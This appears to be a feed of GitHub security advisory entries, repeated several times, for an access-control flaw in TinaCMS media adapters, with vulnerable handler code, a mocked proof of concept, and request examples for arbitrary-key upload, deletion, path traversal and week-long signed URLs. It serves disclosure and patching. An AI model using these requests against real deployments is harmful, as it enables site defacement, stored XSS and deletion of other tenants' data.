  bucket: 'editor-media-bucket',
  mediaRoot: 'media',                 // editors are "scoped to media/"
  authorized: async () =&gt; true,       // typical wiring: TinaCloud verified user
});
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">$ cd /Users/admin/tinacms-s3-poc &amp;&amp; node poc.mjs
--- Exhibit A: presigned PUT URL for arbitrary bucket key ---
  HTTP status : 200
  signedUrl   : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Credential=AKIAFA...
  src         : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html
  signed Key  : /index.html
  RESULT      : BYPASS  (signed URL writes outside media/)

--- Exhibit B: cross-tenant overwrite via attacker-chosen key ---
  signed Key  : /tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (cross-tenant write primitive granted)

--- Exhibit C: arbitrary-key DELETE via [...media] route ---
  HTTP status : 200
  S3 Bucket   : editor-media-bucket
  S3 Key      : tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (arbitrary-key DELETE granted)

--- Exhibit D: attacker-controlled ?expiresIn ---
  X-Amz-Expires: 604800 sec
  RESULT       : BYPASS  (URL valid far longer than the 1h default)
</code></pre>
<p>Verification, in detail:</p>
<ol>
<li><p><strong>Exhibit A</strong> — <code>GET /api/s3/media?key=index.html</code>. <code>mediaRoot=media/</code> is configured but never consulted on the write path. The handler hands back a SigV4 URL whose path is <code>/index.html</code>. PUT'ing any body to that URL would create the bucket-root object <code>index.html</code> against the operator's IAM credentials. For a deployment that fronts the bucket with CloudFront / S3-website hosting, this is a one-shot site-defacement primitive (and, for any CSP that trusts the bucket, a one-shot stored-XSS primitive against the published site).</p>
</li>
<li><p><strong>Exhibit B</strong> — same primitive, attacker-chosen key <code>tenant-victim/posts/announcement.mdx</code>. In the multi-tenant TinaCloud / TinaCMS Cloud deployment shape (one bucket shared across tenants, each tenant assigned a <code>mediaRoot/&lt;tenant&gt;/</code> prefix), a Tenant A editor receives a presigned PUT URL for any Tenant B key. Cross-tenant content tampering with no further bug needed.</p>
</li>
<li><p><strong>Exhibit C</strong> — <code>DELETE /api/s3/media/anything-here-is-ignored/tenant-victim%2Fposts%2Fannouncement.mdx</code>. The handler reads the catch-all as <code>req.query.media = ['anything-here-is-ignored', 'tenant-victim/posts/announcement.mdx']</code>, destructures to <code>objectKey = media[1]</code>, dispatches <code>DeleteObjectCommand({ Bucket: 'editor-media-bucket', Key: 'tenant-victim/posts/announcement.mdx' })</code>. The mock confirms the captured command's <code>Key</code> is the attacker-supplied string. Real S3 will honour the same call. (The mock-captured call confirms the <em>handler's</em> behaviour; the real S3 call requires only <code>s3:DeleteObject</code> on the bucket, which the package's <code>README</code> instructs operators to grant.)</p>
</li>
<li><p><strong>Exhibit D</strong> — <code>?expiresIn=604800</code> (7 days, the SigV4 ceiling). The handler accepts it, the resulting <code>X-Amz-Expires=604800</code>. Combined with Exhibit A, an attacker who briefly compromises a CMS session (e.g. via a stolen idle browser session or the dev-server CSRF write described in finding 06) can mint a long-lived offline write primitive — usable for a week with no further interaction with the CMS.</p>
</li>
</ol>
<p>The four exhibits together: cross-mediaRoot write, cross-tenant write, arbitrary-key delete, and long-lived signed-URL minting.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cross-tenant / cross-mediaRoot write.</strong> In any deployment where the bucket holds anything other than this one editor's <code>mediaRoot</code> (multi-tenant TinaCloud, shared corporate bucket, bucket-backed static site), an authorized editor obtains write authority over every key the IAM credential can reach. Concretely: defacement of a static site fronted by the bucket; cross-tenant content tampering; replacement of <code>*.html</code>, <code>*.js</code>, <code>*.json</code> assets that downstream consumers trust. (Exhibits A, B; <code>handlers.ts:67-90</code>.)</li>
<li><strong>Stored XSS via uploaded HTML.</strong> S3 returns objects with the <code>Content-Type</code> the upload supplies. The presigned <code>PutObjectCommand</code> URL carries no <code>Content-Type</code> constraint — the attacker's <code>PUT</code> chooses it. An editor can therefore write an HTML / SVG / JS payload to the bucket-root, and any CDN or origin that serves bucket objects directly to an authenticated SaaS surface inherits stored XSS in that origin.</li>
<li><strong>Arbitrary-key delete (data destruction).</strong> Through <code>[...media]</code> the handler treats the second URL segment as a free-form object key. An editor can wipe any object the IAM key can <code>s3:DeleteObject</code>, including non-media artefacts like deployment manifests, backups, or other tenants' files. (Exhibit C; <code>handlers.ts:199-223</code>.)</li>
<li><strong>Bucket-policy implications.</strong> The <code>README</code> (lines 38-90) tells operators to grant the IAM key <code>s3:PutObject</code>, <code>s3:PutObjectAcl</code>, <code>s3:DeleteObject</code>, and <code>s3:ListBucket</code> on the <em>whole</em> bucket. The README implies the application code constrains the editor's actions to <code>mediaRoot</code>. Because the application code does not, every operator who follows the README has — without realising — granted every CMS editor full write/delete on the whole bucket.</li>
<li><strong>Long-lived offline write primitive.</strong> <code>expiresIn</code> is attacker-controlled and not capped by the handler. A single GET request mints a URL valid for up to 7 days (AWS SigV4 ceiling). An attacker who briefly compromises a CMS session can stash one such URL and continue writing arbitrary objects long after the session is revoked. (Exhibit D.)</li>
<li><strong>Same-shape exposure on every other first-party media adapter.</strong> <code>next-tinacms-dos</code> (DigitalOcean Spaces, S3-compatible), <code>next-tinacms-azure</code> (Blob Storage), and <code>next-tinacms-cloudinary</code> (Cloudinary) all duplicate the broken pattern. Azure has <em>no</em> mediaRoot config at all, so the boundary that <code>next-tinacms-s3</code> advertises but doesn't enforce isn't even nominally present in <code>next-tinacms-azure</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7088">https://github.com/tinacms/tinacms/pull/7088</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce">https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4">https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59992">https://nvd.nist.gov/vuln/detail/CVE-2026-59992</a></li>
<li><a href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-19T21:56:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next-tinacms-dos] Tina: Broken Access Control: arbitrary bucket-key write/delete in `next-tinacms-s3` (and sibling production media adapters)]]></title>
        <id>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</id>
        <link href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4"/>
        <updated>2026-08-21T18:31:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The production media handler shipped by <code>next-tinacms-s3</code> (<code>createMediaHandler</code> in <code>packages/next-tinacms-s3/src/handlers.ts</code>) accepts an attacker-chosen <code>?key=</code> query parameter and returns an AWS-signed <code>PutObject</code> URL whose <code>Key</code> is that value, with no check that the key falls under the operator's configured <code>mediaRoot</code>. The same handler's <code>DELETE</code> branch reads <code>objectKey = (req.query.media as string[])[1]</code> and dispatches a <code>DeleteObjectCommand</code> for that exact key, again unbounded by <code>mediaRoot</code>. Any caller that passes the operator-supplied <code>authorized()</code> predicate — i.e. any logged-in CMS editor in a typical TinaCloud / self-hosted deployment — therefore has write and delete authority over the <em>entire</em> S3 bucket the IAM key can reach, even though the package documents <code>mediaRoot</code> as the place where editors are scoped. The same shape is present in <code>next-tinacms-dos</code>, <code>next-tinacms-azure</code>, and <code>next-tinacms-cloudinary</code>, so a single design mistake spans every first-party production media backend.</p>
<ul>
<li>Project: TinaCMS — first-party production media adapters (consumed by self-hosted Next.js sites and TinaCloud-backed deployments).</li>
<li>Source reviewed: <code>tinacms/tinacms</code> @ <code>main</code> (<code>b56dad4</code>).</li>
<li>Deployed artefact validated: <code>next-tinacms-s3@21.0.3</code> handler logic, exercised against <code>@aws-sdk/client-s3@3.665.x</code> via <code>aws-sdk-client-mock@4.1.0</code> (the AWS SDK signs the URL identically whether the bucket is real or mocked).</li>
<li>Affected file(s):<ul>
<li><code>packages/next-tinacms-s3/src/handlers.ts:67-90</code> — <code>GET ?key=</code> returns presigned <code>PutObjectCommand</code> URL with attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code> — <code>DELETE</code> reads <code>[, objectKey] = media</code> and issues <code>DeleteObjectCommand</code> against attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-dos/src/handlers.ts:79-152</code> and <code>:249-278</code> — same write/delete pattern, plus a server-side upload that builds the key with <code>path.join(mediaRoot, prefix + filename)</code> over attacker-controlled <code>directory</code> and <code>filename</code>.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes <code>path.join(directory, filename)</code> with both fields attacker-controlled (no <code>mediaRoot</code> configured at all); <code>deleteAsset</code> deletes any blob in the container.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>cloudinary.uploader.destroy(public_id)</code> over attacker-chosen <code>public_id</code>.</li>
</ul>
</li>
<li>CWE: CWE-639 — Authorization Bypass Through User-Controlled Key. Adjacent: CWE-284 (Improper Access Control), CWE-862 (Missing Authorization on the per-key authority check).</li>
<li>OWASP 2021: <strong>A01:2021 — Broken Access Control</strong> (the operator's intended <code>mediaRoot</code> boundary is enforced only on listing, not on writes or deletes). Secondary: A04:2021 — Insecure Design (every adapter independently re-implements the same broken pattern).</li>
</ul>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>packages/next-tinacms-s3/src/handlers.ts:39-98</code>:</p>
<pre><code class="language-ts">export const createMediaHandler = (config: S3Config, options?: S3Options) =&gt; {
  const client = new S3Client(config.config);
  const bucket = config.bucket;
  let mediaRoot = config.mediaRoot || '';                 // (1)
  if (mediaRoot) { /* normalise to "media/" form */ }

  return async (req: NextApiRequest, res: NextApiResponse) =&gt; {
    const isAuthorized = await config.authorized(req, res);
    if (!isAuthorized) {
      res.status(401).json({ message: 'sorry this user is unauthorized' });
      return;
    }
    switch (req.method) {
      case 'GET':
        if (req.query.key) {
          const expiresIn: number =
            (req.query.expiresIn &amp;&amp; Number(req.query.expiresIn)) || 3600; // (2)
          const s3_key = req.query.key
            ? Array.isArray(req.query.key) ? req.query.key[0] : req.query.key
            : null;
          if (!s3_key) return res.status(400).json({ message: 'key is required' });
          if (await keyExists(client, bucket, s3_key)) {
            return res.status(400).json({ message: 'key already exists' }); // (3)
          }
          const signedUrl = await getUploadUrl(bucket, s3_key, expiresIn, client); // (4)
          return res.json({ signedUrl, src: cdnUrl + s3_key });
        }
        return listMedia(req, res, client, bucket, mediaRoot, cdnUrl);     // (5)
      case 'DELETE':
        return deleteAsset(req, res, client, bucket);                      // (6)
</code></pre>
<p><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code>:</p>
<pre><code class="language-ts">async function deleteAsset(req, res, client, bucket) {
  const { media } = req.query;
  const [, objectKey] = media as string[];                                  // (7)
  const params: DeleteObjectCommandInput = { Bucket: bucket, Key: objectKey };
  const command = new DeleteObjectCommand(params);
  ...
}
</code></pre>
<p>At <strong>(1)</strong> the operator configures <code>mediaRoot</code> (e.g. <code>"media/"</code>), and the package's <code>README</code> documents this as the directory the IAM key is scoped to. At <strong>(4)</strong> the handler signs a <code>PutObjectCommand</code> with <code>Key: s3_key</code> taken verbatim from <code>req.query.key</code>. Nothing between (1) and (4) verifies that <code>s3_key</code> starts with <code>mediaRoot</code>, so any path the IAM key can reach is fair game. The only filter is the <code>keyExists</code> check at <strong>(3)</strong>, which prevents <em>overwrite</em> of an existing object but not creation of arbitrary new ones (and not overwrite of objects the IAM key cannot <code>HeadObject</code>). At <strong>(2)</strong> the validity window of the produced URL is also attacker-controlled, capped only by AWS SigV4's 7-day hard limit. At <strong>(5)</strong> the <em>list</em> path <strong>does</strong> prefix-join <code>mediaRoot</code> (<code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>), demonstrating that the boundary was understood to exist — it just isn't enforced on writes. At <strong>(6)</strong> + <strong>(7)</strong> delete extracts the second URL segment into <code>objectKey</code> with no prefix check, so <code>DELETE /api/s3/media/x/anything-in-the-bucket</code> is a valid arbitrary-key delete primitive.</p>
<p>For contrast, the same package's <code>listMedia</code> (line 139) does write <code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>, and <code>stripMediaRoot</code> (line 100) exists explicitly to peel <code>mediaRoot</code> off keys returned to the client — so the codebase models <code>mediaRoot</code> as a security boundary on the read side. The write and delete sides simply forgot to apply it.</p>
<p>The same misalignment is duplicated in three sibling packages:</p>
<ul>
<li><code>packages/next-tinacms-dos/src/handlers.ts:115-125</code> — upload builds <code>Key: mediaRoot ? path.join(mediaRoot, prefix + filename) : prefix + filename</code> over attacker-controlled <code>prefix</code> (from <code>req.body.directory</code>) and <code>filename</code> (from <code>multer</code>'s <code>file.originalname</code>); <code>path.join</code> collapses <code>..</code> segments, so a <code>directory</code> of <code>../..</code> plus a chosen <code>filename</code> lands at any key in the bucket. Lines 249-278 reproduce the S3 delete-by-second-segment pattern.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes a blob at <code>path.join(directory, filename)</code> with both values straight out of <code>formData</code>. <code>next-tinacms-azure</code> has no <code>mediaRoot</code> config at all (<code>AzureBlobStorageConfig</code> in <code>src/types.ts</code>), so the entire container is writable / deletable by any authorized user.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>deleteAsset</code> calls <code>cloudinary.uploader.destroy(public_id)</code> over the attacker-chosen second segment, deleting any asset in the cloud. The same handler's <code>listMedia</code> (line 110) interpolates <code>mediaListOptions.directory</code> directly into a Cloudinary search-expression DSL string (<code>folder="${directory}"</code>), giving an authorized user full search-expression injection — out of scope for this finding but worth a separate report.</li>
</ul>
<h2 id="reproduction-validated-locally">Reproduction (validated locally)</h2>
<p>Environment: Node 22, <code>@aws-sdk/client-s3@3.665.0</code>, <code>@aws-sdk/s3-request-presigner@3.665.0</code>, <code>aws-sdk-client-mock@4.1.0</code>. The harness vendors <code>createMediaHandler</code> byte-for-byte from <code>packages/next-tinacms-s3/src/handlers.ts</code> and runs it against a mocked <code>S3Client</code>. The AWS SDK signs the URL identically whether the bucket exists — the resulting URL is the same one a real S3 deployment would hand back to the editor's browser, so it would PUT against a real bucket without further help.</p>
<p>PoC layout under <code>/Users/admin/joplin_research/tinacms-s3-poc/</code>:</p>
<pre><code>package.json            (deps only)
handler-vendored.mjs    (verbatim copy of createMediaHandler, types stripped)
poc.mjs                 (four exhibits exercising the handler)
</code></pre>
<p>Handler is configured the way the package's <code>README</code> documents:</p>
<pre><code class="language-js">const handler = createMediaHandler({
  config: { region: 'us-east-1', credentials: { accessKeyId: '…', secretAccessKey: '…' } },
  bucket: 'editor-media-bucket',
  mediaRoot: 'media',                 // editors are "scoped to media/"
  authorized: async () =&gt; true,       // typical wiring: TinaCloud verified user
});
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">$ cd /Users/admin/tinacms-s3-poc &amp;&amp; node poc.mjs
--- Exhibit A: presigned PUT URL for arbitrary bucket key ---
  HTTP status : 200
  signedUrl   : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Credential=AKIAFA...
  src         : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html
  signed Key  : /index.html
  RESULT      : BYPASS  (signed URL writes outside media/)

--- Exhibit B: cross-tenant overwrite via attacker-chosen key ---
  signed Key  : /tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (cross-tenant write primitive granted)

--- Exhibit C: arbitrary-key DELETE via [...media] route ---
  HTTP status : 200
  S3 Bucket   : editor-media-bucket
  S3 Key      : tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (arbitrary-key DELETE granted)

--- Exhibit D: attacker-controlled ?expiresIn ---
  X-Amz-Expires: 604800 sec
  RESULT       : BYPASS  (URL valid far longer than the 1h default)
</code></pre>
<p>Verification, in detail:</p>
<ol>
<li><p><strong>Exhibit A</strong> — <code>GET /api/s3/media?key=index.html</code>. <code>mediaRoot=media/</code> is configured but never consulted on the write path. The handler hands back a SigV4 URL whose path is <code>/index.html</code>. PUT'ing any body to that URL would create the bucket-root object <code>index.html</code> against the operator's IAM credentials. For a deployment that fronts the bucket with CloudFront / S3-website hosting, this is a one-shot site-defacement primitive (and, for any CSP that trusts the bucket, a one-shot stored-XSS primitive against the published site).</p>
</li>
<li><p><strong>Exhibit B</strong> — same primitive, attacker-chosen key <code>tenant-victim/posts/announcement.mdx</code>. In the multi-tenant TinaCloud / TinaCMS Cloud deployment shape (one bucket shared across tenants, each tenant assigned a <code>mediaRoot/&lt;tenant&gt;/</code> prefix), a Tenant A editor receives a presigned PUT URL for any Tenant B key. Cross-tenant content tampering with no further bug needed.</p>
</li>
<li><p><strong>Exhibit C</strong> — <code>DELETE /api/s3/media/anything-here-is-ignored/tenant-victim%2Fposts%2Fannouncement.mdx</code>. The handler reads the catch-all as <code>req.query.media = ['anything-here-is-ignored', 'tenant-victim/posts/announcement.mdx']</code>, destructures to <code>objectKey = media[1]</code>, dispatches <code>DeleteObjectCommand({ Bucket: 'editor-media-bucket', Key: 'tenant-victim/posts/announcement.mdx' })</code>. The mock confirms the captured command's <code>Key</code> is the attacker-supplied string. Real S3 will honour the same call. (The mock-captured call confirms the <em>handler's</em> behaviour; the real S3 call requires only <code>s3:DeleteObject</code> on the bucket, which the package's <code>README</code> instructs operators to grant.)</p>
</li>
<li><p><strong>Exhibit D</strong> — <code>?expiresIn=604800</code> (7 days, the SigV4 ceiling). The handler accepts it, the resulting <code>X-Amz-Expires=604800</code>. Combined with Exhibit A, an attacker who briefly compromises a CMS session (e.g. via a stolen idle browser session or the dev-server CSRF write described in finding 06) can mint a long-lived offline write primitive — usable for a week with no further interaction with the CMS.</p>
</li>
</ol>
<p>The four exhibits together: cross-mediaRoot write, cross-tenant write, arbitrary-key delete, and long-lived signed-URL minting.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cross-tenant / cross-mediaRoot write.</strong> In any deployment where the bucket holds anything other than this one editor's <code>mediaRoot</code> (multi-tenant TinaCloud, shared corporate bucket, bucket-backed static site), an authorized editor obtains write authority over every key the IAM credential can reach. Concretely: defacement of a static site fronted by the bucket; cross-tenant content tampering; replacement of <code>*.html</code>, <code>*.js</code>, <code>*.json</code> assets that downstream consumers trust. (Exhibits A, B; <code>handlers.ts:67-90</code>.)</li>
<li><strong>Stored XSS via uploaded HTML.</strong> S3 returns objects with the <code>Content-Type</code> the upload supplies. The presigned <code>PutObjectCommand</code> URL carries no <code>Content-Type</code> constraint — the attacker's <code>PUT</code> chooses it. An editor can therefore write an HTML / SVG / JS payload to the bucket-root, and any CDN or origin that serves bucket objects directly to an authenticated SaaS surface inherits stored XSS in that origin.</li>
<li><strong>Arbitrary-key delete (data destruction).</strong> Through <code>[...media]</code> the handler treats the second URL segment as a free-form object key. An editor can wipe any object the IAM key can <code>s3:DeleteObject</code>, including non-media artefacts like deployment manifests, backups, or other tenants' files. (Exhibit C; <code>handlers.ts:199-223</code>.)</li>
<li><strong>Bucket-policy implications.</strong> The <code>README</code> (lines 38-90) tells operators to grant the IAM key <code>s3:PutObject</code>, <code>s3:PutObjectAcl</code>, <code>s3:DeleteObject</code>, and <code>s3:ListBucket</code> on the <em>whole</em> bucket. The README implies the application code constrains the editor's actions to <code>mediaRoot</code>. Because the application code does not, every operator who follows the README has — without realising — granted every CMS editor full write/delete on the whole bucket.</li>
<li><strong>Long-lived offline write primitive.</strong> <code>expiresIn</code> is attacker-controlled and not capped by the handler. A single GET request mints a URL valid for up to 7 days (AWS SigV4 ceiling). An attacker who briefly compromises a CMS session can stash one such URL and continue writing arbitrary objects long after the session is revoked. (Exhibit D.)</li>
<li><strong>Same-shape exposure on every other first-party media adapter.</strong> <code>next-tinacms-dos</code> (DigitalOcean Spaces, S3-compatible), <code>next-tinacms-azure</code> (Blob Storage), and <code>next-tinacms-cloudinary</code> (Cloudinary) all duplicate the broken pattern. Azure has <em>no</em> mediaRoot config at all, so the boundary that <code>next-tinacms-s3</code> advertises but doesn't enforce isn't even nominally present in <code>next-tinacms-azure</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7088">https://github.com/tinacms/tinacms/pull/7088</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce">https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4">https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59992">https://nvd.nist.gov/vuln/detail/CVE-2026-59992</a></li>
<li><a href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-19T21:56:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next-tinacms-s3] Tina: Broken Access Control: arbitrary bucket-key write/delete in `next-tinacms-s3` (and sibling production media adapters)]]></title>
        <id>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</id>
        <link href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4"/>
        <updated>2026-08-21T18:31:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The production media handler shipped by <code>next-tinacms-s3</code> (<code>createMediaHandler</code> in <code>packages/next-tinacms-s3/src/handlers.ts</code>) accepts an attacker-chosen <code>?key=</code> query parameter and returns an AWS-signed <code>PutObject</code> URL whose <code>Key</code> is that value, with no check that the key falls under the operator's configured <code>mediaRoot</code>. The same handler's <code>DELETE</code> branch reads <code>objectKey = (req.query.media as string[])[1]</code> and dispatches a <code>DeleteObjectCommand</code> for that exact key, again unbounded by <code>mediaRoot</code>. Any caller that passes the operator-supplied <code>authorized()</code> predicate — i.e. any logged-in CMS editor in a typical TinaCloud / self-hosted deployment — therefore has write and delete authority over the <em>entire</em> S3 bucket the IAM key can reach, even though the package documents <code>mediaRoot</code> as the place where editors are scoped. The same shape is present in <code>next-tinacms-dos</code>, <code>next-tinacms-azure</code>, and <code>next-tinacms-cloudinary</code>, so a single design mistake spans every first-party production media backend.</p>
<ul>
<li>Project: TinaCMS — first-party production media adapters (consumed by self-hosted Next.js sites and TinaCloud-backed deployments).</li>
<li>Source reviewed: <code>tinacms/tinacms</code> @ <code>main</code> (<code>b56dad4</code>).</li>
<li>Deployed artefact validated: <code>next-tinacms-s3@21.0.3</code> handler logic, exercised against <code>@aws-sdk/client-s3@3.665.x</code> via <code>aws-sdk-client-mock@4.1.0</code> (the AWS SDK signs the URL identically whether the bucket is real or mocked).</li>
<li>Affected file(s):<ul>
<li><code>packages/next-tinacms-s3/src/handlers.ts:67-90</code> — <code>GET ?key=</code> returns presigned <code>PutObjectCommand</code> URL with attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code> — <code>DELETE</code> reads <code>[, objectKey] = media</code> and issues <code>DeleteObjectCommand</code> against attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-dos/src/handlers.ts:79-152</code> and <code>:249-278</code> — same write/delete pattern, plus a server-side upload that builds the key with <code>path.join(mediaRoot, prefix + filename)</code> over attacker-controlled <code>directory</code> and <code>filename</code>.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes <code>path.join(directory, filename)</code> with both fields attacker-controlled (no <code>mediaRoot</code> configured at all); <code>deleteAsset</code> deletes any blob in the container.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>cloudinary.uploader.destroy(public_id)</code> over attacker-chosen <code>public_id</code>.</li>
</ul>
</li>
<li>CWE: CWE-639 — Authorization Bypass Through User-Controlled Key. Adjacent: CWE-284 (Improper Access Control), CWE-862 (Missing Authorization on the per-key authority check).</li>
<li>OWASP 2021: <strong>A01:2021 — Broken Access Control</strong> (the operator's intended <code>mediaRoot</code> boundary is enforced only on listing, not on writes or deletes). Secondary: A04:2021 — Insecure Design (every adapter independently re-implements the same broken pattern).</li>
</ul>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>packages/next-tinacms-s3/src/handlers.ts:39-98</code>:</p>
<pre><code class="language-ts">export const createMediaHandler = (config: S3Config, options?: S3Options) =&gt; {
  const client = new S3Client(config.config);
  const bucket = config.bucket;
  let mediaRoot = config.mediaRoot || '';                 // (1)
  if (mediaRoot) { /* normalise to "media/" form */ }

  return async (req: NextApiRequest, res: NextApiResponse) =&gt; {
    const isAuthorized = await config.authorized(req, res);
    if (!isAuthorized) {
      res.status(401).json({ message: 'sorry this user is unauthorized' });
      return;
    }
    switch (req.method) {
      case 'GET':
        if (req.query.key) {
          const expiresIn: number =
            (req.query.expiresIn &amp;&amp; Number(req.query.expiresIn)) || 3600; // (2)
          const s3_key = req.query.key
            ? Array.isArray(req.query.key) ? req.query.key[0] : req.query.key
            : null;
          if (!s3_key) return res.status(400).json({ message: 'key is required' });
          if (await keyExists(client, bucket, s3_key)) {
            return res.status(400).json({ message: 'key already exists' }); // (3)
          }
          const signedUrl = await getUploadUrl(bucket, s3_key, expiresIn, client); // (4)
          return res.json({ signedUrl, src: cdnUrl + s3_key });
        }
        return listMedia(req, res, client, bucket, mediaRoot, cdnUrl);     // (5)
      case 'DELETE':
        return deleteAsset(req, res, client, bucket);                      // (6)
</code></pre>
<p><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code>:</p>
<pre><code class="language-ts">async function deleteAsset(req, res, client, bucket) {
  const { media } = req.query;
  const [, objectKey] = media as string[];                                  // (7)
  const params: DeleteObjectCommandInput = { Bucket: bucket, Key: objectKey };
  const command = new DeleteObjectCommand(params);
  ...
}
</code></pre>
<p>At <strong>(1)</strong> the operator configures <code>mediaRoot</code> (e.g. <code>"media/"</code>), and the package's <code>README</code> documents this as the directory the IAM key is scoped to. At <strong>(4)</strong> the handler signs a <code>PutObjectCommand</code> with <code>Key: s3_key</code> taken verbatim from <code>req.query.key</code>. Nothing between (1) and (4) verifies that <code>s3_key</code> starts with <code>mediaRoot</code>, so any path the IAM key can reach is fair game. The only filter is the <code>keyExists</code> check at <strong>(3)</strong>, which prevents <em>overwrite</em> of an existing object but not creation of arbitrary new ones (and not overwrite of objects the IAM key cannot <code>HeadObject</code>). At <strong>(2)</strong> the validity window of the produced URL is also attacker-controlled, capped only by AWS SigV4's 7-day hard limit. At <strong>(5)</strong> the <em>list</em> path <strong>does</strong> prefix-join <code>mediaRoot</code> (<code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>), demonstrating that the boundary was understood to exist — it just isn't enforced on writes. At <strong>(6)</strong> + <strong>(7)</strong> delete extracts the second URL segment into <code>objectKey</code> with no prefix check, so <code>DELETE /api/s3/media/x/anything-in-the-bucket</code> is a valid arbitrary-key delete primitive.</p>
<p>For contrast, the same package's <code>listMedia</code> (line 139) does write <code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>, and <code>stripMediaRoot</code> (line 100) exists explicitly to peel <code>mediaRoot</code> off keys returned to the client — so the codebase models <code>mediaRoot</code> as a security boundary on the read side. The write and delete sides simply forgot to apply it.</p>
<p>The same misalignment is duplicated in three sibling packages:</p>
<ul>
<li><code>packages/next-tinacms-dos/src/handlers.ts:115-125</code> — upload builds <code>Key: mediaRoot ? path.join(mediaRoot, prefix + filename) : prefix + filename</code> over attacker-controlled <code>prefix</code> (from <code>req.body.directory</code>) and <code>filename</code> (from <code>multer</code>'s <code>file.originalname</code>); <code>path.join</code> collapses <code>..</code> segments, so a <code>directory</code> of <code>../..</code> plus a chosen <code>filename</code> lands at any key in the bucket. Lines 249-278 reproduce the S3 delete-by-second-segment pattern.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes a blob at <code>path.join(directory, filename)</code> with both values straight out of <code>formData</code>. <code>next-tinacms-azure</code> has no <code>mediaRoot</code> config at all (<code>AzureBlobStorageConfig</code> in <code>src/types.ts</code>), so the entire container is writable / deletable by any authorized user.</li>
